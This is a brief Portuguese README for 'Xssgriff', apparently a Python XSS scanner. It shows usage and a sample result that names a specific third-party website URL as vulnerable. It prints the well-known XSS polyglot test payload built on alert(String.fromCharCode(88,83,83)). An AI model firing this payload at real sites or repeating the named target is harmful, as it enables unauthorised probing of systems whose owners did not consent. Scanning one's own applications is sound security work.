Xssgriff, script para analizar vulnerabilidade em XSS.

Modo de uso:
python xss.py 
url : teste.com.br/page?parameter=

URL: http://www.koinonia.org.br/tpdigital/detalhes.asp?cod_artigo=161&cod_boletim=9&tipo=
Vulneravel: ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

Ao final, mostrando os payloads vulneraveis.

https://www.facebook.com/JRPENTESTER
